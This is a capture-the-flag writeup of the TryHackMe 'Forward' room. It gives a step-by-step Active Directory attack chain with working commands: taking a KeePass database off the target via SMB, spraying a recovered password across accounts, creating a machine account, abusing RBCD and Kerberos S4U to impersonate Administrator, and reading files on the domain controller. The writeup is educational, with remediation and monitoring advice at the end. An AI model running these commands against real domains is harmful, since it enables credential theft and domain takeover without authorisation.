# Forward Challenge 
*[Image: Banner]*

**Pathway:** *Jr Penetration Tester* | **Section:** *Active Directory Security Testing Basics* | **Challenge:** *[Forward](https://tryhackme.com/room/forwardchallenge)*

> [!IMPORTANT]
> **Spoiler warning:** This writeup documents the exploitation chain used during the room, but flag values, passwords and other challenge-sensitive values are intentionally redacted.
>
> **Please note:** The IP addresses shown in this writeup were allocated during the TryHackMe lab, with the attack performed from my own Kali Linux VM using OpenVPN connected to the TryHackMe VPN.
>
> **License:** Unless otherwise stated, all writeups and documentation in this repository are licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/). Any original scripts or code snippets are provided under the [MIT Licence](https://opensource.org/license/mit/).
>
> This writeup uses the following placeholders to avoid exposing lab-specific or sensitive information:
>
>: `<TARGET_IP>` - the IP address assigned to the target host when the TryHackMe machine is started.
>: `<TUN0_IP>` - the IP address assigned to my Kali Linux VM when connected to the TryHackMe VPN using OpenVPN.
>: `<REDACTED>` - information intentionally removed from the public writeup, such as credentials, hashes, tickets, usernames where appropriate, and other challenge-sensitive values.
>
> This writeup reflects my own route through the challenge. Other learners may solve the room using different tools, commands or techniques. To preserve the integrity of the challenge and act responsibly towards TryHackMe and the wider learning community, I choose what to redact from my public writeups unless asked by TryHackMe or another appropriate party to redact or remove additional material.

---

**Confirmed lab details used during testing:**

```text
Target IP: <TARGET_IP>
Kali tun0 IP: <TUN0_IP>
Attacker working directory: /tmp/VK
Domain used during testing: ctf.local
Domain Controller hostname: DC01.ctf.local
```

## About TryHackMe

This writeup was made possible by the hard work of the TryHackMe team and the wider cyber security community, who continue to create practical and engaging learning environments for aspiring security professionals.

[TryHackMe](https://tryhackme.com/) is an online cyber security training platform that provides hands-on labs covering penetration testing, networking, Active Directory, privilege escalation, web application security and defensive security. Its rooms give learners a controlled and authorised environment to practise realistic attack paths without targeting real-world systems.

This writeup documents the **Forward** challenge from the **Jr Penetration Tester** pathway. The room focuses on movement through an assumed-breach Active Directory environment, credential discovery, credential reuse, BloodHound-driven attack path analysis, Resource-Based Constrained Delegation and Kerberos ticket abuse.

## Lab Summary

The objective of this challenge was to move through a compromised Active Directory environment and retrieve the Administrator flag from the Domain Controller.

The successful attack chain involved:

1. Confirming the target as a Windows Active Directory Domain Controller.
2. Validating the initial low-privilege domain credentials supplied by the room.
3. Accessing the host through RDP and locating a KeePass database in the user profile.
4. Moving the KeePass database to an SMB-accessible file drop share.
5. Recovering additional Help Desk credentials from the KeePass database.
6. Testing credential reuse against another Help Desk-related account.
7. Collecting and reviewing BloodHound data to understand Active Directory object permissions.
8. Creating a controlled machine account in the domain.
9. Abusing Resource-Based Constrained Delegation against the Domain Controller computer object.
10. Requesting a Kerberos service ticket while impersonating `Administrator`.
11. Using the delegated CIFS ticket to access the Domain Controller administrative share.
12. Reading the Administrator flag file from the Administrator desktop.

No real-world systems were targeted. All testing was performed inside the TryHackMe lab environment.

## Tools Used

The main tools used were:

- `nmap` for targeted service enumeration.
- `rustscan` for quick TCP port discovery.
- `dig` for DNS confirmation.
- `netexec` / `nxc` for SMB, RDP and domain enumeration.
- `smbclient` for interacting with SMB shares.
- `xfreerdp3` for RDP access from Kali.
- `BloodHound` and `bloodhound-python` for Active Directory relationship mapping.
- `KeePassXC` / `keepassxc-cli` for working with the KeePass database.
- `impacket-addcomputer` for creating a controlled machine account.
- `impacket-rbcd` for configuring Resource-Based Constrained Delegation.
- `impacket-getST` for S4U ticket requests.
- `impacket-smbclient` for Kerberos-authenticated SMB access.
- Standard Linux and Windows utilities such as `grep`, `sed`, `ls`, `Get-ChildItem`, `Copy-Item` and `Get-Content`.

## Initial Enumeration

### Local Name Resolution

Before enumeration, the target was mapped locally so tools could resolve the lab domain and Domain Controller hostname correctly.

```bash
echo "<TARGET_IP> ctf.local" | sudo tee -a /etc/hosts
```

Later, after Kerberos-based tooling was used, the hosts file also needed the Domain Controller fully qualified domain name:

```bash
echo "<TARGET_IP> DC01.ctf.local DC01 ctf.local" | sudo tee -a /etc/hosts
```

The hosts file was checked with:

```bash
getent hosts DC01.ctf.local
```

The expected result was that `DC01.ctf.local` resolved only to `<TARGET_IP>`.

> [!TIP]
> When using your own Kali VM, the `/etc/hosts` file is especially important in these TryHackMe web challenges. Many rooms rely on hostname-based routing, virtual hosts, cookies, redirects or application logic that will not behave correctly if the hostname is missing. Over time, `/etc/hosts` can become cluttered with old lab entries, so it is advantageous to keep it clear, tidy and focused on the challenge currently being worked on. A messy hosts file is basically DNS spaghetti: technically edible, but nobody sensible wants it.

### Port and Service Scan

I started the enumeration with RustScan to quickly identify open TCP ports before moving into more targeted service enumeration. This is useful in TryHackMe rooms because it gives a fast view of the exposed attack surface without waiting for a full Nmap scan to complete first.

```bash
rustscan -b 500 -a <TARGET_IP> --top -- -sC -sV -Pn
```

The command uses a batch size of 500, scans the most common ports against <TARGET_IP>, and passes the discovered ports into Nmap with default scripts, service version detection, and host discovery disabled.

The scan confirmed that the host was exposing several typical Active Directory services, including DNS, Kerberos, LDAP, SMB, RDP, and Microsoft RPC. This strongly suggested that the target was a Windows Domain Controller rather than a standalone Windows host.

```text
Open <TARGET_IP>:53
Open <TARGET_IP>:88
Open <TARGET_IP>:135
Open <TARGET_IP>:139
Open <TARGET_IP>:389
Open <TARGET_IP>:445
Open <TARGET_IP>:464
Open <TARGET_IP>:593
Open <TARGET_IP>:636
Open <TARGET_IP>:3268
Open <TARGET_IP>:3269
Open <TARGET_IP>:3389
Open <TARGET_IP>:9389
```

The follow-up Nmap output also identified the domain as ctf.local and the host as DC01.ctf.local, confirming that the environment was Active Directory-based.

```bash
nmap -Pn -sT -sV --version-light \
-p 53,88,135,139,389,445,464,593,636,3268,3269,3389,9389 \
<TARGET_IP> -oN nmap-forward-initial.txt
```

This made /etc/hosts configuration especially important. For Active Directory rooms, tools often rely on correct hostname and FQDN resolution. In this challenge, entries such as ctf.local, DC01, and DC01.ctf.local needed to resolve cleanly to <TARGET_IP>. Old TryHackMe entries in /etc/hosts can cause tools to connect to a stale machine IP, resulting in confusing timeouts or Kerberos/SMB failures.

```text
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: Host: DC01; OS: Windows
```

Important services included:

```text
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  ncacn_http
636/tcp   open  ldaps
3268/tcp  open  ldap Global Catalog
3269/tcp  open  ldaps Global Catalog SSL
3389/tcp  open  ms-wbt-server
9389/tcp  open  adws
```

The scan identified the host as a Windows Server 2019 Domain Controller:

```text
Domain: ctf.local
NetBIOS domain: CTF
Computer name: DC01
DNS name: DC01.ctf.local
```

A quick DNS lookup confirmed that the Domain Controller hostname resolved correctly through the target DNS service:

```bash
dig @<TARGET_IP> DC01.ctf.local
```

### Validating Initial Access

The room provided initial domain credentials. These were validated against SMB:

```bash
nxc smb <TARGET_IP> -u '<REDACTED>' -p '<REDACTED>' --shares
```

The account authenticated successfully and could read standard domain shares, including `NETLOGON` and `SYSVOL`. It also had access to a `Downloads` share used as a file drop location.

RDP authentication was then tested:

```bash
nxc rdp <TARGET_IP> -u '<REDACTED>' -p '<REDACTED>'
```

The result showed the account could log in over RDP.

### BloodHound Collection

BloodHound data was collected to map relationships and object-level permissions in the domain:

```bash
bloodhound-python \
-u '<REDACTED>' \
-p '<REDACTED>' \
-d ctf.local \
-dc DC01.ctf.local \
-ns <TARGET_IP> \
-c All \
--zip
```

The collection identified a small Active Directory environment with one Domain Controller, a limited number of users and several interesting ACL relationships. The most important relationship was linked to the Domain Controller computer object and later became the privilege escalation path.

## Exploits

### Finding the KeePass Database

After connecting over RDP with the initial account, PowerShell was used to search the user profile for KeePass databases:

```powershell
Get-ChildItem -Path C:\Users\<REDACTED> -Recurse -Filter *.kdbx -ErrorAction SilentlyContinue | Select-Object FullName,Length,LastWriteTime
```

This found a KeePass database inside the user profile:

```text
C:\Users\<REDACTED>\Documents\Database.kdbx
```

### Moving the KeePass Database Through SMB

The `Downloads` SMB share was readable from Kali and was also usable as a file transfer point from the Windows session. Before copying the file, I confirmed the local backing path of the share from Windows:

```powershell
Get-SmbShare -Name Downloads | Select-Object Name,Path,Description
```

This showed that the share pointed to C:\Downloads, so the KeePass database could be copied into that location:

```powershell
Copy-Item -Path "C:\Users\<REDACTED>\Documents\Database.kdbx" -Destination "C:\Downloads\Database.kdbx" -Force
```

The file was then pulled down from Kali using smbclient:

```bash
smbclient //<TARGET_IP>/Downloads -U 'ctf.local/<REDACTED>%<REDACTED>' -c 'get Database.kdbx'
```

This transfer was useful for offline analysis and confirmed that the database could be moved out of the Windows session. However, the successful credential recovery was completed from the KeePass application inside the RDP session, where the database unlocked using the selected Windows User Account option.

### Reviewing the KeePass Database

An attempt was made to extract the KeePass hash with `keepass2john`, but the local version did not support this database format:

```text
File version '<REDACTED>' is currently not supported
```

Although the database was copied to Kali for offline analysis, the successful route did not require cracking the KeePass database. While logged in through RDP, I pressed the Windows key, searched for KeePass, and opened the KeePass application directly on the target.

When prompted to unlock the database, the Windows User Account option was already selected. Clicking OK unlocked the database without requiring a separate password or key file. This indicated that the database was protected using the logged-in Windows account context rather than a standalone master password.

The database contained a credential entry for a Help Desk account:

```
<REDACTED> : <REDACTED>
```

The recovered credential was then tested successfully against RDP:

```bash
nxc rdp <TARGET_IP> -u '<REDACTED>' -p '<REDACTED>'
```

This confirmed that the Help Desk account could be used for interactive access to the target system.

### Credential Reuse

Further enumeration showed several user profiles on the Domain Controller, including Help Desk-related users and a service account. These usernames were added into a small `users.txt` file so they could be tested cleanly without repeatedly typing each account name.

```bash
cat > users.txt << 'EOF'
<REDACTED>
<REDACTED>
<REDACTED>
<REDACTED>
EOF
```

This created a focused username list based on accounts observed during enumeration, rather than using a large generic wordlist. In an Active Directory challenge, this is usually more accurate because valid usernames are often exposed through SMB, RDP sessions, profile directories, BloodHound data, or account enumeration.

The recovered credential was then tested against the collected usernames to check for password reuse:

```bash
nxc smb <TARGET_IP> -u users.txt -p '<REDACTED>' --continue-on-success
```

Testing revealed that one recovered password had been reused by another account:

```bash
nxc smb <TARGET_IP> -u '<REDACTED>' -p '<REDACTED>'
```

The reused credential provided the next identity required for the attack path.

### Understanding the BloodHound Path

BloodHound data showed that the Domain Controller computer object had an ACL path allowing Resource-Based Constrained Delegation to be configured by the compromised account. This was the critical escalation point.

The relevant idea was:

```text
Compromised domain user -> write RBCD setting on DC01$ -> controlled computer account can impersonate users to DC01 services
```

This was not a local administrator path at first. It was an Active Directory object control issue. That distinction matters because nothing obvious in local group membership clearly shouted “Domain Admin this way”. BloodHound did the heavy lifting by exposing the relationship.

### Creating a Controlled Machine Account

A controlled machine account was created in the domain:

```bash
impacket-addcomputer 'ctf.local/<REDACTED>:<REDACTED>' \
-dc-ip <TARGET_IP> \
-computer-name '<REDACTED>$' \
-computer-pass '<REDACTED>'
```

The output confirmed that the machine account was created successfully:

```text
[*] Successfully added machine account <REDACTED>$ with password <REDACTED>
```

### Writing Resource-Based Constrained Delegation

The compromised account was then used to grant the controlled machine account permission to impersonate users to the Domain Controller computer object:

```bash
impacket-rbcd \
-dc-ip <TARGET_IP> \
-delegate-from '<REDACTED>$' \
-delegate-to 'DC01$' \
-action 'write' \
'ctf.local/<REDACTED>:<REDACTED>'
```

The successful output confirmed that the RBCD attribute was modified:

```text
[*] Delegation rights modified successfully!
[*] <REDACTED>$ can now impersonate users on DC01$ via S4U2Proxy
```

### Requesting an Administrator CIFS Ticket

With RBCD configured, an S4U service ticket was requested for CIFS on the Domain Controller while impersonating `Administrator`:

```bash
impacket-getST \
-dc-ip <TARGET_IP> \
'ctf.local/<REDACTED>$:<REDACTED>' \
-spn 'cifs/DC01.ctf.local' \
-impersonate Administrator
```

This produced a Kerberos credential cache:

```text
Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
```

The ticket cache was exported into the current shell:

```bash
export KRB5CCNAME=/tmp/VK/Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
```

### Accessing the Domain Controller Administrative Share

The Administrator CIFS ticket was used to access SMB without a password:

```bash
impacket-smbclient -k -no-pass ctf.local/Administrator@DC01.ctf.local
```

Available shares included:

```text
ADMIN$
C$
Downloads
IPC$
NETLOGON
SYSVOL
```

The `C$` administrative share was selected:

```text
use C$
```

The Administrator desktop was browsed:

```text
cd Users\Administrator\Desktop
ls
```

The flag file was present:

```text
flag.txt
```

The file was read through SMB:

```text
cat flag.txt
```

The flag value has been intentionally redacted from this public writeup:

```text
THM{....}
```

## Full Attack Chain Recap

### 1. The Domain Controller was identified through standard AD enumeration

Initial scanning showed a Windows Server 2019 Domain Controller exposing DNS, Kerberos, LDAP, SMB, RDP, Global Catalog and AD Web Services. DNS confirmed the hostname `DC01.ctf.local`, and the lab domain was identified as `ctf.local`.

### 2. The provided account gave assumed-breach access

The challenge began from an assumed-breach position. The supplied low-privilege domain account was valid over SMB and RDP. This provided an interactive foothold on the Domain Controller, but not immediate administrative access.

### 3. A KeePass database exposed further credentials

Searching the initial user profile revealed a KeePass database. The database was moved through the `Downloads` share and reviewed offline. It contained credentials for another domain account associated with Help Desk operations.

### 4. Credential reuse provided the escalation identity

The recovered credential worked for one account and was then reused successfully against another account. That second account had the Active Directory object permission needed for the intended escalation route.

### 5. BloodHound revealed the real attack path

Local group membership alone did not explain the route to Administrator. BloodHound showed that the useful relationship existed at the AD object permission level, specifically around the Domain Controller computer object and Resource-Based Constrained Delegation.

### 6. A controlled machine account was created

A new computer account was added to the domain. Because the attacker controlled the machine account password, it could later be used to request Kerberos tickets after delegation was configured.

### 7. RBCD was configured against the Domain Controller

The compromised account was used to modify the Domain Controller computer object so the controlled machine account could act on behalf of other identities. This enabled S4U2Proxy abuse against services on `DC01`.

### 8. Kerberos S4U produced Administrator CIFS access

Using the controlled machine account, a CIFS service ticket was requested for `DC01.ctf.local` while impersonating `Administrator`. The resulting Kerberos cache allowed SMB access to the Domain Controller as Administrator without knowing the Administrator password.

### 9. The Administrator flag was recovered through SMB

With the Administrator CIFS ticket loaded, `impacket-smbclient` accessed the `C$` administrative share. The Administrator desktop contained `flag.txt`, which was read through the SMB session. The flag has been redacted from this writeup as `THM{....}`.

## Key Lessons

* Hosts File Hygiene Matters: When using your own VM, `/etc/hosts` can become a silent troublemaker. Old TryHackMe entries can cause Kerberos and Impacket tools to resolve hostnames to stale IP addresses, resulting in timeouts, failed SMB connections and plenty of unnecessary head-scratching. Keep it tidy and challenge-specific.
* Active Directory Enumeration Is Relationship-Driven: Privilege escalation did not come from an obvious local administrator membership. The useful permission was an AD object relationship, which is exactly why BloodHound-style enumeration is so valuable.
* Credential Stores Are High-Value Targets: KeePass databases, browser stores, scripts and internal notes can all turn a basic foothold into meaningful movement. Even where the database itself is protected, weak or reused passwords can still expose the next step.
* Credential Reuse Still Hurts: A password recovered for one account was useful against another account. This is one of the oldest problems in security, which is annoying because it remains one of the most effective.
* Machine Account Quota Can Enable Abuse: If ordinary domain users can create computer accounts, attackers may create controlled machine accounts for delegation-based attacks. This is not automatically exploitable on its own, but it becomes dangerous when combined with object write permissions.
* RBCD Is Extremely Powerful: Resource-Based Constrained Delegation can allow a controlled service or machine account to impersonate privileged users to specific services. On a Domain Controller, CIFS access as Administrator is game over.
* Kerberos Depends on Names, Not Just IPs: The service principal name used in a ticket must line up with the hostname used by the client. Correct DNS or `/etc/hosts` configuration is therefore essential when working with Kerberos tickets.

## Remediation Notes

The weaknesses in this lab could be mitigated by:

* Protect User Credential Stores: Users should not store operational credentials in accessible KeePass databases without strong master passwords, key files or additional controls. Administrative or service credentials should never be placed in normal user-accessible stores unless there is a clear approved process.
* Enforce Unique Passwords: Password reuse between users and service-like accounts should be prevented through policy, monitoring and password management practices. Shared operational passwords should be replaced with managed identity workflows.
* Reduce Machine Account Creation Rights: Review `ms-DS-MachineAccountQuota`. If normal users do not need to join machines to the domain, reduce it to `0` and require controlled provisioning.
* Audit RBCD Permissions: Regularly review `msDS-AllowedToActOnBehalfOfOtherIdentity` and ACLs that allow users to write or append delegation settings on computer objects, especially Domain Controllers and high-value servers.
* Monitor S4U Activity: Alert on unusual S4U2Self and S4U2Proxy ticket requests, particularly where low-privilege or newly created machine accounts request tickets for sensitive users such as `Administrator`.
* Protect Domain Controller Computer Objects: Domain Controller objects should have tightly controlled ACLs. Non-administrative accounts should not be able to alter delegation-related attributes on these objects.
* Review Help Desk Privileges: Help Desk accounts often accumulate dangerous delegated permissions over time. Their rights should be documented, least-privilege and reviewed regularly.
* Maintain Accurate Internal Documentation: Internal notes, automation notices and operational files should not disclose credentials, workflows or privilege relationships that could help an attacker move laterally.

## Disclaimer

This writeup is intended solely for education, training and documentation of an authorised TryHackMe lab.

All tools, commands, payloads and post-exploitation techniques described here were used within a controlled environment provided by TryHackMe. Permission to interact with the target was granted by the platform owner and operator as part of the room.

The tools and methods documented in this walkthrough represent one successful approach. They are not the only possible techniques, and alternative tools or workflows may produce the same result.

Never test, scan, exploit or access a system without clear and explicit authorisation from its owner.

---
[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://buymeacoffee.com/v4l1k4hn)  

**Powered on ☕ made with ❤️ by [V4L1K4HN](https://tryhackme.com/p/V4L1K4HN)**  
⭐ If this project is useful, consider starring it on GitHub.
